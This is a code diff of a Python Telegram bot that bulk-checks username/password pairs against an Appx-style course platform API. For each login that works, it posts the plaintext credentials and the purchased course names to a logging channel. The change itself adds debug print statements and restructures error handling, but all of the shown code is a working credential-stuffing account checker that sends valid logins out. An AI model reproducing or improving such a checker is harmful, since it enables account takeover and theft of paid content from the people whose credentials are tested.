@@ -51,6 +51,7 @@ async def safe_edit(msg, text):
 async def login_and_get_courses(n, p, api, bot, progress_msg):
     async with SEM:
         is_valid = False
+        print(f"[START] Checking {n}")
 
         h = {
             "client-service": "Appx",
@@ -71,6 +72,7 @@ async def login_and_get_courses(n, p, api, bot, progress_msg):
 
         loop = asyncio.get_running_loop()
 
+        # ---------- LOGIN ----------
         try:
             r1 = await loop.run_in_executor(
                 None,
@@ -80,58 +82,68 @@ async def login_and_get_courses(n, p, api, bot, progress_msg):
                 d
             )
             r1 = r1.json()
-        except:
-            pass
+            print(f"[LOGIN-RESP] {n} -> {r1.get('status')}")
+        except Exception as e:
+            print(f"[LOGIN-ERROR] {n} -> {e}")
+            r1 = None
+
+        data = r1.get("data") if isinstance(r1, dict) else None
+        token = data.get("token") if isinstance(data, dict) else None
+        user_id = data.get("userid") if isinstance(data, dict) else None
+
+        if not token or not user_id:
+            print(f"[LOGIN-INVALID] {n} token={bool(token)} userid={user_id}")
         else:
-            data = r1.get("data") if isinstance(r1, dict) else None
-            token = data.get("token") if isinstance(data, dict) else None
-            user_id = data.get("userid") if isinstance(data, dict) else None
+            print(f"[LOGIN-OK] {n} userid={user_id}")
 
-            if token and user_id:
-                h.update({
-                    "Authorization": token,
-                    "User-ID": user_id
-                })
+            h.update({
+                "Authorization": token,
+                "User-ID": user_id
+            })
 
-                # ---- COURSE FETCH WITH RETRY ----
-                for _ in range(3):
-                    try:
-                        r2 = await loop.run_in_executor(
-                            None,
-                            get_request,
-                            f"https://{api}/get/mycourseweb?userid={user_id}",
-                            h
-                        )
-                        r2 = r2.json()
-                    except:
-                        r2 = None
+            # ---------- COURSE FETCH WITH RETRY ----------
+            for attempt in range(1, 4):
+                try:
+                    print(f"[COURSE-TRY-{attempt}] {n}")
+                    r2 = await loop.run_in_executor(
+                        None,
+                        get_request,
+                        f"https://{api}/get/mycourseweb?userid={user_id}",
+                        h
+                    )
+                    r2 = r2.json()
+                except Exception as e:
+                    print(f"[COURSE-ERROR-{attempt}] {n} -> {e}")
+                    r2 = None
 
-                    courses = r2.get("data") if isinstance(r2, dict) else None
-                    if isinstance(courses, list) and courses:
-                        batches = [
-                            i.get("course_name")
-                            for i in courses
-                            if isinstance(i, dict) and i.get("course_name")
-                        ]
+                courses = r2.get("data") if isinstance(r2, dict) else None
 
-                        if batches:
-                            is_valid = True
+                if isinstance(courses, list) and courses:
+                    print(f"[COURSE-OK] {n} batches={len(courses)}")
+                    batches = [
+                        i.get("course_name")
+                        for i in courses
+                        if isinstance(i, dict) and i.get("course_name")
+                    ]
 
-                            success_text = (
-                                f"👤 Account: `{n}*{p}`\n\n"
-                                f"📚 Total Batches: {len(batches)}\n\n"
-                            )
-                            for b in batches:
-                                success_text += f"🪪 {b}\n"
+                    is_valid = True
 
-                            await asyncio.sleep(LOG_DELAY)
-                            await bot.send_message(LOG_CHANNEL_ID, success_text)
-                            results.append(success_text)
-                        break
+                    success_text = (
+                        f"👤 Account: `{n}*{p}`\n\n"
+                        f"📚 Total Batches: {len(batches)}\n\n"
+                    )
+                    for b in batches:
+                        success_text += f"🪪 {b}\n"
 
-                    # backend delay handling
+                    await asyncio.sleep(LOG_DELAY)
+                    await bot.send_message(LOG_CHANNEL_ID, success_text)
+                    results.append(success_text)
+                    break
+                else:
+                    print(f"[COURSE-EMPTY-{attempt}] {n} -> {courses}")
                     await asyncio.sleep(1.5)
 
+        # ---------- STATS ----------
         async with stats_lock:
             stats["checked"] += 1
             if is_valid:
@@ -158,8 +170,8 @@ async def login_and_get_courses(n, p, api, bot, progress_msg):
                 )
             )
 
-        await asyncio.sleep(REQUEST_DELAY)
-
+        print(f"[END] {n} valid={is_valid}")
+        await asyncio.sleep(REQUEST_DELAY)                            
 # ================= COMMAND =================
 @app.on_message(filters.command("babe"))
 async def pw_command_handler(bot, m):
